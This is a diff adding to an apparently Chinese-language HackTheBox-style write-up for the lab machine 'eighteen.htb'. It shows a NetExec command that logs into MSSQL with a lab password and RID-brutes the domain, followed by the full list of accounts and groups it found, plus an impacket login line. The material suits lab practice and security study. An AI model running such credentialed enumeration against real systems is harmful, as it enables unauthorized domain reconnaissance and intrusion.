@@ -65,6 +65,52 @@ Host script results:
 ## 初始访问
 
 ### MSSQL 枚举
+
+```
+$ nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
+
+MSSQL       10.129.122.5    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
+MSSQL       10.129.122.5    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
+MSSQL       10.129.122.5    1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
+MSSQL       10.129.122.5    1433   DC01             500: EIGHTEEN\Administrator
+MSSQL       10.129.122.5    1433   DC01             501: EIGHTEEN\Guest
+MSSQL       10.129.122.5    1433   DC01             502: EIGHTEEN\krbtgt
+MSSQL       10.129.122.5    1433   DC01             512: EIGHTEEN\Domain Admins
+MSSQL       10.129.122.5    1433   DC01             513: EIGHTEEN\Domain Users
+MSSQL       10.129.122.5    1433   DC01             514: EIGHTEEN\Domain Guests
+MSSQL       10.129.122.5    1433   DC01             515: EIGHTEEN\Domain Computers
+MSSQL       10.129.122.5    1433   DC01             516: EIGHTEEN\Domain Controllers
+MSSQL       10.129.122.5    1433   DC01             517: EIGHTEEN\Cert Publishers
+MSSQL       10.129.122.5    1433   DC01             518: EIGHTEEN\Schema Admins
+MSSQL       10.129.122.5    1433   DC01             519: EIGHTEEN\Enterprise Admins
+MSSQL       10.129.122.5    1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
+MSSQL       10.129.122.5    1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
+MSSQL       10.129.122.5    1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
+MSSQL       10.129.122.5    1433   DC01             525: EIGHTEEN\Protected Users
+MSSQL       10.129.122.5    1433   DC01             526: EIGHTEEN\Key Admins
+MSSQL       10.129.122.5    1433   DC01             527: EIGHTEEN\Enterprise Key Admins
+MSSQL       10.129.122.5    1433   DC01             528: EIGHTEEN\Forest Trust Accounts
+MSSQL       10.129.122.5    1433   DC01             529: EIGHTEEN\External Trust Accounts
+MSSQL       10.129.122.5    1433   DC01             553: EIGHTEEN\RAS and IAS Servers
+MSSQL       10.129.122.5    1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
+MSSQL       10.129.122.5    1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
+MSSQL       10.129.122.5    1433   DC01             1000: EIGHTEEN\DC01$
+MSSQL       10.129.122.5    1433   DC01             1101: EIGHTEEN\DnsAdmins
+MSSQL       10.129.122.5    1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
+MSSQL       10.129.122.5    1433   DC01             1601: EIGHTEEN\mssqlsvc
+MSSQL       10.129.122.5    1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
+MSSQL       10.129.122.5    1433   DC01             1603: EIGHTEEN\HR
+MSSQL       10.129.122.5    1433   DC01             1604: EIGHTEEN\IT
+MSSQL       10.129.122.5    1433   DC01             1605: EIGHTEEN\Finance
+MSSQL       10.129.122.5    1433   DC01             1606: EIGHTEEN\jamie.dunn
+MSSQL       10.129.122.5    1433   DC01             1607: EIGHTEEN\jane.smith
+MSSQL       10.129.122.5    1433   DC01             1608: EIGHTEEN\alice.jones
+MSSQL       10.129.122.5    1433   DC01             1609: EIGHTEEN\adam.scott
+MSSQL       10.129.122.5    1433   DC01             1610: EIGHTEEN\bob.brown
+MSSQL       10.129.122.5    1433   DC01             1611: EIGHTEEN\carol.white
+MSSQL       10.129.122.5    1433   DC01             1612: EIGHTEEN\dave.green
+```
+
 #### SQL 身份验证（访客访问）
 ```BASH
 impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
